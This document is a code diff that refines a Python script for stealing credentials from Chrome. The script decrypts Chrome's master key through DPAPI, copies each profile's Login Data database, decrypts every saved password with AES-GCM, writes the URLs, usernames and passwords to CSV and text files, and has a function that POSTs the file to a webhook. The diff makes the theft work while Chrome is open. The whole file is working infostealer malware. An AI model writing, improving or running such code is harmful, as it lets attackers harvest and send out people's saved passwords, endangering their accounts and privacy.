@@ -6,7 +6,6 @@ import base64 as b
 import sqlite3 as q
 import win32crypt as w
 from Crypto.Cipher import AES
-import shutil as h
 import csv as c
 import requests as req
 
@@ -14,46 +13,50 @@ import requests as req
 C1 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (o.environ['USERPROFILE']))
 C2 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (o.environ['USERPROFILE']))
 
-# Function to get secret key from Chrome's Local State
 def k1():
+    """Get and decrypt Chrome's master key from Local State."""
     try:
         with open(C1, "r", encoding='utf-8') as f:
-            l = j.loads(f.read())
-        s_k = b.b64decode(l["os_crypt"]["encrypted_key"])[5:]
-        s_k = w.CryptUnprotectData(s_k, None, None, None, 0)[1]
-        return s_k
+            local_state = j.load(f)
+        encrypted_key = b.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        return w.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     except Exception as e:
         print(f"[ERR] Chrome secret key not found: {e}")
         return None
 
-# Function to generate AES cipher
-def k3(a_k, iv):
-    return AES.new(a_k, AES.MODE_GCM, iv)
+def k3(aes_key, iv):
+    """Return an AES-GCM cipher object."""
+    return AES.new(aes_key, AES.MODE_GCM, iv)
 
-# Function to decrypt the password
-def k4(c_t, s_k):
+def k4(cipher_blob, aes_key):
+    """Decrypt a single Chrome password blob."""
     try:
-        iv = c_t[3:15]
-        e_p = c_t[15:-16]
-        tag = c_t[-16:]  # Extract authentication tag
-        cy = k3(s_k, iv)
-        d_p = cy.decrypt_and_verify(e_p, tag).decode()
-        return d_p
+        iv = cipher_blob[3:15]
+        ciphertext = cipher_blob[15:-16]
+        tag = cipher_blob[-16:]
+        cipher = k3(aes_key, iv)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
     except Exception as e:
         print(f"[ERR] Decryption failed: {e}")
         return ""
 
-# Function to get a connection to the Chrome database
-def k5(chrome_db):
+def k5(chrome_db_path):
+    """
+    Create a safe copy of Chrome's Login Data using SQLite's backup API.
+    Works even if Chrome is open.
+    """
     try:
-        h.copy2(chrome_db, "Loginvault.db")
-        return q.connect("Loginvault.db")
+        src = q.connect(chrome_db_path, check_same_thread=False)
+        dst = q.connect("Loginvault.db")
+        src.backup(dst)
+        src.close()
+        return dst
     except Exception as e:
-        print(f"[ERR] Chrome database not found: {e}")
+        print(f"[ERR] Could not open Chrome DB: {e}")
         return None
 
-# Function to save output to a text file
 def k6(output, file_name='decrypted_passwords.txt'):
+    """Save the decrypted output to a text file."""
     try:
         with open(file_name, 'w', encoding='utf-8') as f:
             f.write(output)
@@ -61,15 +64,14 @@ def k6(output, file_name='decrypted_passwords.txt'):
     except Exception as e:
         print(f"[ERR] Unable to save file: {e}")
 
-# Function to send the content of the txt file to the webhook
-def k7(f_n, w_u):
+def k7(file_name, webhook_url):
+    """POST the saved file content to a webhook URL."""
     try:
-        with open(f_n, 'r', encoding='utf-8') as f:
+        with open(file_name, 'r', encoding='utf-8') as f:
             data = f.read()
-        print(f"[DEBUG] Sending Data: {data[:500]}")  # Print first 500 characters for debugging
-        response = req.post(w_u, data={'file_content': data})
+        response = req.post(webhook_url, data={'file_content': data})
         if response.status_code == 200:
-            print(f"[INFO] Successfully sent data to the webhook.")
+            print("[INFO] Successfully sent data to the webhook.")
         else:
             print(f"[ERR] Webhook failed. Status Code: {response.status_code}")
     except Exception as e:
@@ -77,32 +79,43 @@ def k7(f_n, w_u):
 
 if __name__ == '__main__':
     try:
+        master_key = k1()
+        if not master_key:
+            s.exit(1)
+
+        profiles = [d for d in o.listdir(C2) if r.match(r"^Profile \d+$", d) or d == "Default"]
         output_data = ""
-        s_k = k1()
-        f = [el for el in o.listdir(C2) if r.search("^Profile*|^Default$", el) is not None]
+        csv_file = 'decrypted_password.csv'
 
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as df:
-            cw = c.writer(df, delimiter=',')
-            cw.writerow(["index", "url", "username", "password"])
+        with open(csv_file, mode='w', newline='', encoding='utf-8') as df:
+            writer = c.writer(df)
+            writer.writerow(["index", "url", "username", "password"])
 
-            for folder in f:
-                c_db = o.path.normpath(f"{C2}\\{folder}\\Login Data")  # Fixed the backslashes
-                conn = k5(c_db)
-                if s_k and conn:
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for index, login in enumerate(cursor.fetchall()):
-                        url, username, ciphertext = login
-                        if url and username and ciphertext:
-                            d_p = k4(ciphertext, s_k)
-                            print(f"URL: {url}\nUsername: {username}\nPassword: {d_p}\n{'-'*50}")  # Debugging
-                            output_data += f"Sequence: {index}\nURL: {url}\nUsername: {username}\nPassword: {d_p}\n{'*'*50}\n"
-                            cw.writerow([index, url, username, d_p])
-                    cursor.close()
-                    conn.close()
-                    o.remove("Loginvault.db")
-        
+            for profile in profiles:
+                db_path = o.path.join(C2, profile, "Login Data")
+                conn = k5(db_path)
+                if not conn:
+                    continue
+
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for idx, (url, user, blob) in enumerate(cursor.fetchall()):
+                    # Skip empty or non-AES-GCM blobs
+                    if not blob or not blob.startswith(b'v10'):
+                        continue
+
+                    password = k4(blob, master_key)
+                    print(f"URL: {url}\nUsername: {user}\nPassword: {password}\n{'-'*50}")
+                    output_data += f"Sequence: {idx}\nURL: {url}\nUsername: {user}\nPassword: {password}\n{'*'*50}\n"
+                    writer.writerow([idx, url, user, password])
+
+                cursor.close()
+                conn.close()
+                o.remove("Loginvault.db")
+
         k6(output_data)
-        k7('decrypted_passwords.txt', 'replace it with your webhook')
+        # Replace '<your_webhook_url>' with actual URL if you want to POST
+        # k7('decrypted_passwords.txt', '<your_webhook_url>')
+
     except Exception as e:
         print(f"[ERR] {e}")
